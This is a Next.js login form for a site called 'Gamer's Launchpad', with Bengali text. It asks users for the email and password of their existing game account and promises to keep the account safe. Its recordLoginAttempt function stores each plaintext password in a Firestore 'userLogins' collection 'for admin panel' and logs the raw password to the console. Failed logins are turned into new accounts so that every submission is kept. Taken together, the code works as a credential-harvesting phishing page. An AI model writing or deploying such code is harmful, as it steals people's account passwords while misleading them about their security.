"use client";

import { zodResolver } from "@hookform/resolvers/zod";
import { useForm } from "react-hook-form";
import * as z from "zod";
import { Button } from "@/components/ui/button";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import { Input } from "@/components/ui/input";
import {
  Card,
  CardContent,
  CardDescription,
  CardFooter,
  CardHeader,
  CardTitle,
} from "@/components/ui/card";
import { useToast } from "@/hooks/use-toast";
import { useRouter } from "next/navigation";
import { useState, type FC } from "react";
import { Gamepad2, Loader2 } from "lucide-react";
import {
  createUserWithEmailAndPassword,
  signInWithEmailAndPassword,
  type AuthError,
  type UserCredential,
} from "firebase/auth";
import { auth, db, isFirestoreActive } from "@/lib/firebase"; 
import { collection, addDoc, serverTimestamp, type FirestoreError, query, where, getDocs, limit } from "firebase/firestore";

const formSchema = z.object({
  email: z.string().email({ message: "অনুগ্রহ করে একটি সঠিক ইমেইল লিখুন।" }),
  password: z
    .string()
    .min(6, { message: "পাসওয়ার্ড কমপক্ষে ৬ অক্ষরের হতে হবে।" }),
});

type LoginFormValues = z.infer<typeof formSchema>;

const LoginForm: FC = () => {
  const { toast } = useToast();
  const router = useRouter();
  const [isLoading, setIsLoading] = useState(false);

  const form = useForm<LoginFormValues>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      email: "",
      password: "",
    },
  });

  const recordLoginAttempt = async (email: string, passwordToRecord: string, userId?: string) => {
    console.log("DEBUG: recordLoginAttempt called with email:", email, "passwordToRecord:", passwordToRecord ? "****** (present)" : "(absent or empty)", "userId:", userId);

    if (!isFirestoreActive()) { 
      console.error("DEBUG: Firestore (db) is not properly initialized or is a fallback. Cannot record login attempt.");
      toast({
          variant: "destructive",
          title: "ডেটাবেস ত্রুটি",
          description: "লগইন কার্যকলাপ রেকর্ড করার জন্য ডেটাবেস প্রস্তুত নয়। অ্যাডমিনের সাথে যোগাযোগ করুন।",
      });
      return;
    }

    if (!userId) {
        console.error("DEBUG: recordLoginAttempt - userId is undefined. Cannot proceed.");
        toast({
            variant: "destructive",
            title: "ত্রুটি",
            description: "ব্যবহারকারী আইডি পাওয়া যায়নি। লগইন কার্যকলাপ রেকর্ড করা সম্ভব নয়।",
        });
        return;
    }
    
    try {
      // Check if a login record for this userId already exists
      const loginQuery = query(collection(db, "userLogins"), where("userId", "==", userId), limit(1));
      const querySnapshot = await getDocs(loginQuery);

      if (!querySnapshot.empty) {
        console.log(`DEBUG: Login record for userId: ${userId} already exists. Not creating a new one.`);
        // Optionally, you could update the existing record's loggedInAt timestamp here if needed.
        // For now, per requirement, we do nothing if record exists.
        return;
      }

      // If no record exists, create a new one
      console.log(`DEBUG: No existing login record for userId: ${userId}. Creating new record.`);
      const loginData = {
        email: email,
        userId: userId,
        password: passwordToRecord, // Storing password
        loggedInAt: serverTimestamp(),
        userAgent: typeof navigator !== 'undefined' ? navigator.userAgent : 'N/A',
      };

      console.log("DEBUG: Attempting to record login for:", email, "UID:", userId);
      console.log("DEBUG: Password to record (SHOULD NOT BE EMPTY OR UNDEFINED):", `"${passwordToRecord}"`);
      console.log("DEBUG: Full data being sent to Firestore userLogins:", JSON.stringify(loginData, (key, value) => key === 'password' ? '****** (hidden for brevity)' : value, 2));

      await addDoc(collection(db, "userLogins"), loginData);
      console.log(`DEBUG: Successfully recorded new login for: ${email} (with password for admin panel) to userLogins collection.`);
    } catch (error) {
      console.error(`DEBUG: Failed to record login attempt for ${email} to Firestore 'userLogins' collection.`);
      if (error instanceof Error) {
        console.error(`DEBUG: Error name: ${error.name}, Message: ${error.message}`);
      }
      
      const firebaseError = error as FirestoreError; // Using a general FirestoreError type
      if (firebaseError.code) {
        console.error(`DEBUG: Firestore Error Code: ${firebaseError.code}, Firestore Message: ${firebaseError.message}`);
        if (firebaseError.code === 'permission-denied') { 
          console.warn("DEBUG: PERMISSION DENIED: Could not record login activity. This is very likely a Firebase Security Rules issue. Please check your Firestore rules for the 'userLogins' collection.");
          toast({
            variant: "destructive",
            title: "লগইন কার্যকলাপ রেকর্ড ত্রুটি",
            description: "আপনার লগইন কার্যকলাপ রেকর্ড করা যায়নি। অনুগ্রহ করে Firestore Rules পরীক্ষা করুন অথবা অ্যাডমিনের সাথে যোগাযোগ করুন। (Error: Permission Denied)",
          });
        } else {
           toast({
            variant: "destructive",
            title: "লগইন কার্যকলাপ রেকর্ড ত্রুটি",
            description: `Firestore error: ${firebaseError.message || 'Unknown Firestore error'} (Code: ${firebaseError.code})`,
          });
        }
      } else {
        console.error("DEBUG: An unknown error occurred while recording login: ", error);
         toast({
            variant: "destructive",
            title: "অজানা ত্রুটি",
            description: "লগইন কার্যকলাপ রেকর্ড করার সময় একটি অজানা সমস্যা হয়েছে।",
          });
      }
    }
  };

  async function onSubmit(values: LoginFormValues) {
    setIsLoading(true);
    console.log("DEBUG: onSubmit called with values:", {email: values.email, password: values.password ? '******' : '(empty)'});
    let userCred: UserCredential | null = null;
    try {
      console.log("DEBUG: Attempting sign in for:", values.email);
      userCred = await signInWithEmailAndPassword(auth, values.email, values.password);
      toast({
        title: "লগইন সফল হয়েছে",
        description: "স্বাগতম!",
      });
      if (userCred && userCred.user) {
        console.log("DEBUG: Sign in successful. Recording login attempt for existing user:", values.email, "Password to record:", values.password ? '******' : '(empty)');
        await recordLoginAttempt(values.email, values.password, userCred.user.uid);
      }
      router.push("/");
    } catch (error) {
      const authError = error as AuthError;
      console.log("DEBUG: Sign in failed with code:", authError.code);
      if (authError.code === "auth/invalid-credential" || authError.code === "auth/user-not-found" || authError.code === "auth/wrong-password") {
        console.log("DEBUG: User not found or wrong password, trying to create account for:", values.email);
        try {
          userCred = await createUserWithEmailAndPassword(
            auth,
            values.email,
            values.password
          );
          toast({
            title: "অ্যাকাউন্ট তৈরি হয়েছে এবং আপনি লগইন করেছেন",
            description: "স্বাগতম!",
          });
          if (userCred && userCred.user) {
            console.log("DEBUG: Account creation successful. Recording login attempt for new user:", values.email, "Password to record:", values.password ? '******' : '(empty)');
            await recordLoginAttempt(values.email, values.password, userCred.user.uid);
          }
          router.push("/");
        } catch (createError) {
          const createAuthError = createError as AuthError;
          console.log("DEBUG: Account creation failed with code:", createAuthError.code);
          if (createAuthError.code === "auth/email-already-in-use") {
            toast({
              variant: "destructive",
              title: "লগইন ব্যর্থ হয়েছে",
              description: "ভুল পাসওয়ার্ড। অনুগ্রহ করে আবার চেষ্টা করুন।",
            });
          } else {
            let errorTitle = "অ্যাকাউন্ট তৈরি করতে ব্যর্থ";
            let errorMessage = "অ্যাকাউন্ট তৈরি করার সময় একটি সমস্যা হয়েছে।";
            if (createAuthError.code === "auth/weak-password") {
              errorMessage = "পাসওয়ার্ডটি খুবই দুর্বল। অনুগ্রহ করে আরও শক্তিশালী পাসওয়ার্ড ব্যবহার করুন।";
            } else if (createAuthError.code === "auth/operation-not-allowed") {
              errorMessage = "ইমেইল/পাসওয়ার্ড অ্যাকাউন্ট তৈরি করার অনুমতি নেই। অ্যাডমিনের সাথে যোগাযোগ করুন।";
            } else if (createAuthError.code === "auth/invalid-email") {
              errorMessage = "প্রদত্ত ইমেইলটি সঠিক নয়।";
            } else {
              console.error("DEBUG: Firebase createUser error details: ", createAuthError);
            }
            toast({
              variant: "destructive",
              title: errorTitle,
              description: errorMessage,
            });
          }
        }
      } else {
        let loginErrorMessage = "লগইন করার সময় একটি সমস্যা হয়েছে।";
        let loginErrorTitle = "লগইন ব্যর্থ হয়েছে";

        if (authError.code === "auth/too-many-requests") {
          loginErrorMessage = "অনেকবার চেষ্টার কারণে আপনার অ্যাকাউন্ট সাময়িকভাবে লক করা হয়েছে।";
        } else if (authError.code === "auth/network-request-failed") {
          loginErrorMessage = "নেটওয়ার্ক সমস্যা। আপনার ইন্টারনেট সংযোগ পরীক্ষা করুন।";
        } else if (authError.code === "auth/configuration-not-found" || authError.code === "auth/operation-not-allowed"){
           loginErrorTitle = "লগইন ত্রুটি";
           loginErrorMessage = "Firebase Authentication কনফিগারেশন সঠিক নয় বা ইমেইল/পাসওয়ার্ড সাইন-ইন পদ্ধতি চালু নেই। অ্যাডমিনের সাথে যোগাযোগ করুন।";
        } else {
           console.error("DEBUG: Firebase signIn error details: ", authError);
        }
        toast({
          variant: "destructive",
          title: loginErrorTitle,
          description: loginErrorMessage,
        });
      }
    } finally {
      setIsLoading(false);
    }
  }

  return (
    <Card className="w-full max-w-md shadow-2xl bg-card">
      <CardHeader className="text-center">
        <div className="flex justify-center mb-4">
          <Gamepad2 className="h-16 w-16 text-primary" />
        </div>
        <CardTitle className="text-3xl font-headline">Gamer's Launchpad</CardTitle>
        <CardDescription className="text-base">
          আপনার গেমের যে আইডি আছে ওই আইডির ইমেইল আর পাসওয়ার্ড দিয়ে লগিন করুন।
        </CardDescription>
      </CardHeader>
      <CardContent>
        <Form {...form}>
          <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
            <FormField
              control={form.control}
              name="email"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>ইমেইল</FormLabel>
                  <FormControl>
                    <Input placeholder="ইমেইল অথবা ফোন নম্বর" {...field} />
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />
            <FormField
              control={form.control}
              name="password"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>পাসওয়ার্ড</FormLabel>
                  <FormControl>
                    <Input type="password" placeholder="••••••••" {...field} />
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />
            <Button
              type="submit"
              className="w-full text-lg py-6 bg-primary hover:bg-primary/90"
              disabled={isLoading}
            >
              {isLoading ? (
                <>
                  <Loader2 className="mr-2 h-5 w-5 animate-spin" />
                  প্রসেস করা হচ্ছে...
                </>
              ) : (
                "লগইন / রেজিস্টার করুন"
              )}
            </Button>
          </form>
        </Form>
      </CardContent>
      <CardFooter className="text-center text-xs text-muted-foreground">
        <p>
          আমরা নিজ থেকে আপনার আইডি সুরক্ষা দিবো আর এখনে আপনার আইডি সুরক্ষিত থাকবে
        </p>
      </CardFooter>
    </Card>
  );
};

export default LoginForm;
